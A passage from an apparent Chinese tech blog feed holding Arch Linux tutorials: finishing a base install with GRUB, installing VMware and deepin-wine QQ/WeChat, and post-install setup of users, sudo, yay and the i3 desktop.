<li>输入 <code>/China</code> 回车搜索到国内源 ==&gt; 输入 <code>2dd</code> 剪切这两行 ==&gt; 输入 <code>gg</code> 回到文件开头 ==&gt; 输入 <code>p</code> 将剪切的内容贴到开头 ==&gt; 输入 <code>:wq</code>  保存退出</li>
</ul>
<p>推荐清华和中科大源:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br></pre></td></tr></table></figure><br>自行测试，选择自己认为速度快的即可</p>
<h2 id="安装基础包"><a href="#安装基础包" class="headerlink" title="安装基础包"></a>安装基础包</h2><p>使用<code>pacstrap</code>将基础包安装到磁盘上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-headers linux-firmware </span><br></pre></td></tr></table></figure>
<p>base : 基础包</p>
<p>base-devel: 基础扩展包，AUR需要base-devel软件包被安装</p>
<p>linux : linux内核</p>
<p>linux-headers : 内核头文件</p>
<p>linux-firmware : linux框架</p>
<h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><h3 id="配置自动挂载"><a href="#配置自动挂载" class="headerlink" title="配置自动挂载"></a>配置自动挂载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检验是否正确</span></span><br><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
<p><strong>确保几个分区的挂载信息被正确的写入文件，对应的挂载点是否正确</strong></p>
<h3 id="Change-root-到新安装的系统"><a href="#Change-root-到新安装的系统" class="headerlink" title="Change root 到新安装的系统"></a>Change root 到新安装的系统</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>
<p>Chroot 就是变更当前进程及其子进程的可见根路径。变更后，程序无法访问可见根目录外文件和命令。(如将<code>/mnt</code>视为<code>/</code>后,原来的<code>/mnt</code>外的路径都不可见了，相当于直接启动到了<code>/mnt</code>下的系统里)。这个目录(<code>/mnt</code>)叫作<code>charoot监狱</code>。</p>
<p>切换根目录通常为了系统维护(需要将磁盘上的相应目录根据结构挂载到<code>chroot监狱</code>目录下):</p>
<ul>
<li>重新安装 bootloader.</li>
<li>重建 initramfs 镜像.</li>
<li>更新或 降级软件包.</li>
<li>重置 忘记的密码.</li>
<li>在干净的 chroot 中构建软件包</li>
</ul>
<p><strong>条件:</strong></p>
<ul>
<li>root 权限</li>
<li>另一个 linux 环境，例如 liveCD、USB 闪存介质或者一个已经安装的另一个 linux 发行版。</li>
<li>匹配的架构，chroot 前后的环境架构要一致(例如，都是<code>i686</code> 或 <code>x86_64</code>)。可以用以<code>uname -m</code>命令查看当前环境的架构</li>
<li>提前加载 chroot 环境需要的内核模块</li>
<li>如果需要 <code>swap</code>， chroot 前先启用 <code>swap</code> （<code>swapon /dev/sdxY</code>）</li>
<li>如果需要网络，chroot 之前先建立好网络连接</li>
</ul>
<p><strong>这可能使你的电脑被别人使用chroot修改密码，请在安装完系统后将主板的引导顺序修改为系统启动为第一项，或关闭其他引导方式，关闭引导菜单快捷键，设置UEFI/BIOS 管理密码</strong></p>
<h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p>在Linux发行版里中国的时区都使选择上海</p>
<p>创建上海时区的符号链接文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure></p>
<h3 id="提前安装必要的软件包"><a href="#提前安装必要的软件包" class="headerlink" title="提前安装必要的软件包"></a>提前安装必要的软件包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S vim neovim dialog ntfs-3g netctl networkmanager dhclient zsh wpa_supplicant</span><br></pre></td></tr></table></figure>
<p><code>vim</code> :编辑器</p>
<p>neovim：编辑器,与上一个可选</p>
<p><code>dialog</code>: 用于显示来自shell脚本的对话框的工具</p>
<p><code>ntfs-3g</code>:NTFS文件系统驱动程序和实用程序</p>
<p><code>netctl</code> : 网络管理器</p>
<p><code>networkmanager</code>: 检测网络、自动连接网络的程序,与上一个为可选</p>
<p><code>dhclient</code>：DHCP服务,具有全功能的DHCP和IPV6支持，也可安装 <code>dhcpcd</code></p>
<p><code>zsh</code>：shell</p>
<p><code>wpa_supplicant</code>：wifi工具</p>
<h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>
<p>找到 <code>en_US.UTF-8 UTF-8</code> 、 <code>zh_CN.UTF-8 UTF-8</code> 、 <code>zh_HK.UTF-8 UTF-8</code> 、 <code>zh_TW.UTF-8 UTF-8</code> 将前面的注释(<code>#</code>)去掉，保存退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>
<p>创建/etc/locale.conf文件并在文件第一行加入<code>LANG=en_US.UTF-8</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> LANG=en_US.UTF-8 &gt; /etc/locale.conf</span><br></pre></td></tr></table></figure></p>
<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><ul>
<li>设置主机名</li>
</ul>
<p>创建<code>/etc/hostname</code>文件添加一个主机名(如：<code>myhostname</code>)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> myhostname &gt; /etc/hostname</span><br></pre></td></tr></table></figure></p>
<ul>
<li>设置本地地址解析<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加如下内容，将myhostname替换成自己的主机名</span></span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	myhostname.localdomain	myhostname</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>输入两次设置的密码即可，linux上的密码都是不显示的<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h2><p>若需要引导Windows+Linux双系统需要安装以下两个包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S os-prober ntfs-3g intel-ucode amd-ucode</span><br></pre></td></tr></table></figure></p>
<p><code>os-prober</code>:用于检测驱动器上其他操作系统</p>
<p><code>ntfs-3g</code>:NTFS文件系统驱动程序和实用程序,用于识别Windows分区</p>
<p><code>intel-ucode / amd-ucode</code>:厂家为CPU更新驱动用的</p>
<h3 id="BIOS-MBR方式引导-1"><a href="#BIOS-MBR方式引导-1" class="headerlink" title="BIOS/MBR方式引导"></a>BIOS/MBR方式引导</h3><h4 id="安装grub"><a href="#安装grub" class="headerlink" title="安装grub"></a>安装grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub</span><br></pre></td></tr></table></figure>
<p><code>grub</code>:强大的统一引导程序</p>
<h4 id="部署grub"><a href="#部署grub" class="headerlink" title="部署grub"></a>部署grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=i386-pc /dev/sdX</span><br></pre></td></tr></table></figure>
<p><strong>sdX为整个磁盘，不是单独一个分区</strong></p>
<p>若出现<code>will not proceed with blocklists</code>错误，<strong><font color="#ff0000">请检查是否是 BIOS/MBR方式引导及硬盘格式</font></strong>，或加<code>--force</code>强制部署</p>
<h4 id="生成配置文件"><a href="#生成配置文件" class="headerlink" title="生成配置文件"></a>生成配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h3 id="EFI-GPT方式引导-1"><a href="#EFI-GPT方式引导-1" class="headerlink" title="EFI/GPT方式引导"></a>EFI/GPT方式引导</h3><h4 id="安装grub和efibootmgr"><a href="#安装grub和efibootmgr" class="headerlink" title="安装grub和efibootmgr"></a>安装grub和efibootmgr</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr</span><br></pre></td></tr></table></figure>
<p><code>grub</code>:强大的统一引导程序</p>
<p><code>efibootmgr</code>:修改UEFI固件启动管理器变量的工具,用来将启动项写入 NVRAM</p>
<h4 id="生成配置文件-1"><a href="#生成配置文件-1" class="headerlink" title="生成配置文件"></a>生成配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<p>检查系统的引导项是否被写进gurd配置文件中</p>
<h4 id="部署grub-1"><a href="#部署grub-1" class="headerlink" title="部署grub"></a>部署grub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot</span><br></pre></td></tr></table></figure>
<p>将在固件启动管理器中创建一个名叫 GRUB 的条目<br>target通过<code>uname -m</code>查看架构选择</p>
<h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><ul>
<li>输入<code>exit</code>退出chroot环境</li>
<li>手动卸载被挂载的分区:<code>umount -R /mnt</code></li>
<li>重启：<code>reboot</code></li>
</ul>
<p><strong><conf color="ff0000">UEFI/GPT方式引导，若重启未进入grub引导，说明UEFI的引导是设备引导，需要<code>/boot(efi)/boot/bootx64.efi</code>文件，只需将<code>grubx64.efi</code>复制到指定目录重命名为<code>bootx64.efi</code>即可</conf></strong></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Wiki</a></p>
<p><a href="https://www.viseator.com/2017/05/17/arch_install/">以官方Wiki的方式安装ArchLinux</a></p>
<p><a href="https://blog.csdn.net/r8l8q8/article/details/76516523">ArchLinux安装图文教程</a></p>
<p><a href="https://wiki.gentoo.org/wiki/Handbook:X86/Installation/Bootloader">引导程序安装 Gentoo Wiki</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux系安装VMware</title>
    <url>/2019/12/08/ArchLinux%E7%B3%BB%E5%AE%89%E8%A3%85VMware/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="从aur库安装"><a href="#从aur库安装" class="headerlink" title="从aur库安装"></a>从aur库安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-workstation</span><br></pre></td></tr></table></figure>
<p>首次启动使用root权限启动激活</p>
<h2 id="下载的安装包安装"><a href="#下载的安装包安装" class="headerlink" title="下载的安装包安装"></a>下载的安装包安装</h2><p>下载最新的安装包</p>
<p>安装 依赖项:<br>    fuse2 - 提供 vmware-vmblock-fuse<br>    gksu（AUR） - 支持需要 root 权限的操作（比如内存分配、注册许可证等等）<br>    gtkmm - 支持 GUI<br>    linux-headers - 模块编译所需<br>    ncurses5-compat-libsAUR - 支持安装程序的 —console 选项<br>    libcanberra - 支持事件提示音</p>
<p><a href="https://www.vmware.com/go/tryworkstation">VMware Workstation Pro</a><br><a href="https://www.vmware.com/go/downloadplayer">Player</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./VMware-edition-version.release.architecture.bundle</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><strong>当安装程序询问 <code>System service scripts directory</code> 的设置时，输入 <code>/etc/init.d</code> 即可</strong><br>安装过程中会收到”No rc*.d style init script directories”错误。这可以安全忽略，因为Arch使用的是systemd.</p>
<p>一些选项：</p>
<ul>
<li><code>--eulas-agreed</code> : 跳过各种许可协议</li>
<li><code>--console</code> : 使用命令行界面，而非 GUI</li>
<li><code>--custom</code> : 允许自定义安装目录，比如/usr/local（记得修改#Systemd 服务一节下，vmware-usbarbitrator.service中的路径）</li>
<li><code>-I</code>, <code>--ignore-errors</code> : 忽略致命错误</li>
<li><code>--set-setting=vmware-workstation serialNumber XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</code> : 设置安装时使用的序列号（有利于脚本化安装）</li>
<li><code>--required</code> : 只询问必要的问题（当结合<code>--eulas-agreed</code>和<code>--console</code>时可以实现静默安装）</li>
</ul>
<h1 id="添加Systemd服务-可选"><a href="#添加Systemd服务-可选" class="headerlink" title="添加Systemd服务(可选)"></a>添加Systemd服务(可选)</h1><p>安装服务包,之后就能使用enable了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-systemd-services</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://wiki.archlinux.org/index.php/VMware">VMware Wiki</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
        <tag>VMware</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux及衍生发行版上运行QQ-TIM-微信-迅雷</title>
    <url>/2020/09/23/Archlinux%E5%8F%8A%E8%A1%8D%E7%94%9F%E5%8F%91%E8%A1%8C%E7%89%88%E4%B8%8A%E8%BF%90%E8%A1%8CQQ-TIM-%E5%BE%AE%E4%BF%A1-%E8%BF%85%E9%9B%B7/</url>
    <content><![CDATA[<h1 id="最新版"><a href="#最新版" class="headerlink" title="最新版"></a>最新版</h1><p>最新版会存在部分不兼容的问题，如微信发不了大图等，可以试着安装兼容稳定版</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>AUR</strong> :</p>
<p>QQ : <code>deepin-wine-qq</code><br>TIM : <code>deepin-wine-tim</code><br>微信 : <code>deepin-wine-wechat</code><br>迅雷 : <code>deepin-wine-thunderspeed</code></p>
<p><strong>项目地址：</strong> <a href="https://github.com/countstarlight/deepin-wine-qq-arch">QQ</a> , <a href="https://github.com/countstarlight/deepin-wine-tim-arch">TIM</a> , <a href="https://github.com/countstarlight/deepin-wine-wechat-arch">微信</a> , <a href="https://github.com/countstarlight/deepin-wine-thunderspeed-arch">迅雷</a></p>
<h2 id="换用DeepinWine"><a href="#换用DeepinWine" class="headerlink" title="换用DeepinWine"></a>换用DeepinWine</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh -d</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh -d</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh -d</code></p>
<a id="more"></a>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh</code></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>QQ : <code>/opt/deepinwine/apps/Deepin-QQ/run.sh</code></p>
<p>TIM : <code>/opt/deepinwine/apps/Deepin-TIM/run.sh</code></p>
<p>微信 : <code>/opt/deepinwine/apps/Deepin-WeChat/run.sh</code></p>
<p>迅雷 : <code>/opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh</code></p>
<h2 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h2><p>QQ : <code>sudo ln -s /opt/deepinwine/apps/Deepin-QQ/run.sh /usr/bin/qq</code></p>
<p>TIM : <code>sudo ln -s /opt/deepinwine/apps/Deepin-TIM/run.sh /usr/bin/tim</code></p>
<p>微信 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-WeChat/run.sh /usr/bin/wechat</code></p>
<p>迅雷 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh /usr/bin/xunlei</code></p>
<h1 id="兼容稳定版"><a href="#兼容稳定版" class="headerlink" title="兼容稳定版"></a>兼容稳定版</h1><p>QQ : <code>deepin.com.qq.im</code><br>TIM : <code>deepin.com.qq.office</code><br>微信 : <code>deepin.com.wechat2</code><br>迅雷 : <code>deepin.com.thunderspeed</code></p>
<p>对于非 GNOME 桌面 , 安装 <code>xsettingsd</code> ,并配置</p>
<p><code>sudo pacman -S xsettingsd</code></p>
<p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<p>加入以下内容</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+    if [[ -z &quot;$(ps -e | grep -o xsettingsd)&quot; ]]</span></span><br><span class="line"><span class="addition">+    then</span></span><br><span class="line"><span class="addition">+        /usr/bin/xsettingsd &amp;</span></span><br><span class="line"><span class="addition">+    fi</span></span><br></pre></td></tr></table></figure>
<h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<h2 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h2><p><code>/opt/deepinwine/apps/****/run.sh</code></p>
<h2 id="创建软链接-1"><a href="#创建软链接-1" class="headerlink" title="创建软链接"></a>创建软链接</h2><p>QQ : <code>sudo ln -s /opt/deepinwine/apps/Deepin-QQ/run.sh /usr/bin/qq</code></p>
<p>TIM : <code>sudo ln -s /opt/deepinwine/apps/Deepin-TIM/run.sh /usr/bin/tim</code></p>
<p>微信 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-WeChat/run.sh /usr/bin/wechat</code></p>
<p>迅雷 : <code>sudo ln -s /opt/deepinwine/apps/Deepin-ThunderSpeed/run.sh /usr/bin/xunlei</code></p>
]]></content>
      <categories>
        <category>Arch</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch安装之后</title>
    <url>/2020/04/01/Arch%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E/</url>
    <content><![CDATA[<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>创建一个普通用户并创建其家目录和加入<code>whell</code>用户组:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel 用户名</span><br></pre></td></tr></table></figure>
<p><code>wheel</code> 组的概念继承自 <code>UNIX</code>，当需要进行一些系统的高级维护时，往往要用到 <code>root</code> 权限；而“wheel” 组就是一个包含这些特殊权限的用户池；如果不是“wheel”组的成员，就无法取得 <code>root</code> 权限进行一些特权的操作。</p>
<p><strong>将一个已有用户加入<code>wheel</code>用户组: <code>usermod -G wheel 用户名</code></strong></p>
<a id="more"></a>
<h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><ul>
<li><code>staff</code> 和 <code>wheel</code> 的区别: <code>wheel</code> 组是一个拥有 <code>root</code> 特权的用户组；而 <code>staff</code> 组是所有普通用户的集合。</li>
</ul>
<ul>
<li><p>对于服务器来说，希望剥夺 wheel 组用户以外的普通用户通过 su 命令来登录 root 的机会（即只有属于 wheel 组的用户才可以用 su 登录为 root）。这样就进一步增强了系统的安全性。步骤如下：</p>
<ul>
<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到 <code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code> ，将行首的注释 <code>#</code> 去掉。</p>
</li>
<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加 <code>SU_WHEEL_ONLY yes</code> 语句。</p>
</li>
<li><p>将一个用户添加到 wheel 组中。</p>
</li>
<li>用被添加到 <code>wheel</code> 组的用户登录，执行 <code>su</code> 命令输入密码即可登录 <code>root</code> 用户。</li>
</ul>
</li>
</ul>
<h2 id="开放用户组组所有权限-可选"><a href="#开放用户组组所有权限-可选" class="headerlink" title="开放用户组组所有权限(可选)"></a>开放用户组组所有权限(可选)</h2><p>修改 <code>/etc/sudoers</code> 文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 取消注释以允许 wheel 组成员执行任何命令</span></span><br><span class="line"><span class="comment"># %wheel ALL=(ALL) ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 不输入密码执行命令</span></span><br><span class="line"><span class="comment"># %wheel ALL=(ALL) NOPASSWD: ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 取消注释以允许sudo 组的成员执行任何命令</span></span><br><span class="line"><span class="comment"># %sudo ALL=(ALL) ALL</span></span><br></pre></td></tr></table></figure></p>
<h1 id="安装基础软件"><a href="#安装基础软件" class="headerlink" title="安装基础软件"></a>安装基础软件</h1><h2 id="vim-sudo-pacman-S-vim"><a href="#vim-sudo-pacman-S-vim" class="headerlink" title="　vim : sudo pacman -S vim"></a>　vim : <code>sudo pacman -S vim</code></h2><p>或者<code>neovim</code> <code>sudo pacman -S neovim</code></p>
<h2 id="git-sudo-pacman-S-git"><a href="#git-sudo-pacman-S-git" class="headerlink" title="git : sudo pacman -S git"></a>git : <code>sudo pacman -S git</code></h2><h2 id="yay"><a href="#yay" class="headerlink" title="yay"></a>yay</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装AUR基础包</span></span><br><span class="line">sudo pacman -S --needed base-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装yay</span></span><br><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yay.git</span><br><span class="line"><span class="built_in">cd</span> yay</span><br><span class="line">makepkg -si</span><br><span class="line"></span><br><span class="line"><span class="comment"># yay换AUR源 可修改文件`~/.config/yay/config.json`</span></span><br><span class="line">yay --aururl <span class="string">&quot;https://aur.tuna.tsinghua.edu.cn&quot;</span> --save</span><br><span class="line"><span class="comment"># 查看配置</span></span><br><span class="line">yay -P -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加archlinuxcn源，在文件`/etc/pacman.conf`中添加：</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"><span class="comment"># 安装GPG key</span></span><br><span class="line">sudo pacman -Syy</span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure>
<h1 id="修改grub等待时间"><a href="#修改grub等待时间" class="headerlink" title="修改grub等待时间"></a>修改grub等待时间</h1><p>修改<code>/etc/default/grub</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将时间修改为需要的秒数</span></span><br><span class="line">GRUB_TIMEOUT=0</span><br></pre></td></tr></table></figure>
<p>每当修改 <code>/etc/default/grub</code> 或 <code>/etc/grub.d/</code> 中的文件之后，都需要再次生成主配置文件<code>/boot/grub/grub.cfg</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h1 id="安装图形化桌面"><a href="#安装图形化桌面" class="headerlink" title="安装图形化桌面"></a>安装图形化桌面</h1><p>linux 的图形化桌面有很多（主流：KDE,GNOME,Xfce,LXDE,Deepin,Mate等）,这里选择<code>i3</code>，i3是一个动态平铺窗口管理器，主要针对开发人员和高级用户。</p>
<p>图形桌面的安装大多是相同的，举一反三即可安装其他桌面</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg-server lightdm lightdm-gtk-greeter i3-gaps i3blocks rofi alacritty wqy-microhei</span><br></pre></td></tr></table></figure>
<ul>
<li><code>xorg-server</code> : 提供X窗口系统</li>
<li><code>lightdm</code> , <code>lightdm-gtk-greeter</code> : 显示管理器</li>
<li><code>i3-gaps</code> : 窗口管理器</li>
<li><code>i3blocks</code> : i3状态栏</li>
<li><code>rofi</code> : 软件起动器</li>
<li><code>alacritty</code> : 终端</li>
<li><code>wqy-microhei</code> : 中文字体 </li>
</ul>
<p>可用登录管理器(如 : <code>ly</code> (AUR))代替显示管理器,但可能没法兼容闭源Nvidia驱动; 配置开机启动<code>sudo systemctl enable ly</code></p>
<p>若使用<code>xorg-xinit</code>启动：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/X11/xinit/xinitrc ~/.xinitrc</span><br><span class="line">vim ~/.xinitrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换以下内容</span></span><br><span class="line">twm &amp;</span><br><span class="line">xclock -geometry 50x50-1+1 &amp;</span><br><span class="line">xterm -geometry 80x50+494+51 &amp;</span><br><span class="line">xterm -geometry 80x20+494-0 &amp;</span><br><span class="line"><span class="built_in">exec</span> xterm -geometry 80x66+0+0 -name login</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为</span></span><br><span class="line"><span class="built_in">exec</span> i3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后就可执行startx打开i3</span></span><br><span class="line"><span class="comment"># 也可在shell的配置 ~/.bashrc 最后加入 startx 配置用户登录后自动启动</span></span><br></pre></td></tr></table></figure></p>
<p>i3配置<br>初次进入i3会提示是否生成用户配置文件<code>~/.config/i3/config</code>和设置<code>Mod</code>键<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/i3/config</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mod键： Mod1为Alt键,Mod4为Windows/Command键</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$mod</span> Mod4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 状态栏</span></span><br><span class="line"><span class="comment"># bar &#123;</span></span><br><span class="line"><span class="comment"># 	status_command i3status</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line">bar &#123;</span><br><span class="line">	status_command i3blocks</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 软件启动器</span></span><br><span class="line"><span class="comment"># bindsym Mod1+d exec dmenu_run</span></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line">bindsym Mod1+d <span class="built_in">exec</span> rofi -show run</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><ul>
<li><p>直接启用X服务 : <code>xorg-xinit</code> xinit程序允许用户通过<code>startx</code>脚本手动启动X显示服务。</p>
</li>
<li><p>图形显示服务 : <code>xorg-server</code>  启动X显示服务的两种方法是使用显示管理器和直接启动X服务。</p>
</li>
<li><p>显示管理器(登录管理器) :</p>
<ul>
<li>图形界面<ul>
<li><code>GDM</code> : GNOME的显示管理器</li>
<li><code>LightDM</code> : 跨桌面的显示管理器。</li>
<li><code>LXDM</code> : LXDE显示管理器，可以独立于LXDE桌面环境使用。</li>
<li><code>MDM</code> : Linux Mintd中的显示管理器</li>
<li><code>SDDM</code> : 基于QML的显示管理器，替代KDE4的KDM，推荐搭配 Plamsa5 或 LXQt 使用</li>
<li><code>XDM</code> : X显示管理器支持XDMCP（适合服务器的宿主机）</li>
</ul>
</li>
<li>控制台<ul>
<li><a href="https://github.com/ghost1227/cdm">CDM</a> AUR : 控制台显示管理器。</li>
<li><a href="https://github.com/dopsi/console-tdm">Console TDM</a> AUR : 扩展自xinit，由纯粹的Bash脚本编写的。</li>
<li><a href="https://github.com/spanezz/nodm">nodm</a> : 支持自动登录的简单显示管理器。</li>
<li><a href="https://github.com/cylgom/ly">Ly</a> AUR : 实验阶段的 ncurses 显示管理器。</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Window_manager">窗口管理器</a> :<ul>
<li>平铺窗口管理器<ul>
<li><code>i3</code> : <code>i3-wm</code>或<code>i3-gaps</code>平铺窗口管理器（<code>i3-gaps</code>是<code>i3-wm</code>的分支，提供更多的功能）。</li>
</ul>
</li>
<li>堆叠窗口管理器<ul>
<li><code>Metacity</code> : GNOME2曾经默认使用的窗口管理器，后被Mutter取代。</li>
<li><code>Mutter</code> : GNOME3默认的窗口管理器。</li>
<li><code>Kwin</code> : KDE默认的窗口管理器。</li>
<li><code>Xfwm</code> : Xfce默认的窗口管理器。</li>
<li><code>Marco</code> : Mate默认的窗口管理器。</li>
</ul>
</li>
<li>动态窗口管理器<ul>
<li><code>dwm</code> : 用于X 的动态窗口管理器。管理平铺、单片和浮动布局中的窗口。 所有布局都可以动态应用，从而优化了使用中的应用程序和执行的任务的环境。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>lightdm 主题</strong><br>首先需要更改 <code>/etc/lightdm/lightdm.conf</code> 主配置文件设置<code>greeter</code><br>主题目录: <code>/usr/share/themes/</code><br>图标目录:<code>/usr/share/icons/</code></p>
<ul>
<li><p><code>lightdm-gtk-greeter</code>  <a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a> 安装<code>lightdm-gtk-greeter-settings</code> 通过图形界面配置</p>
</li>
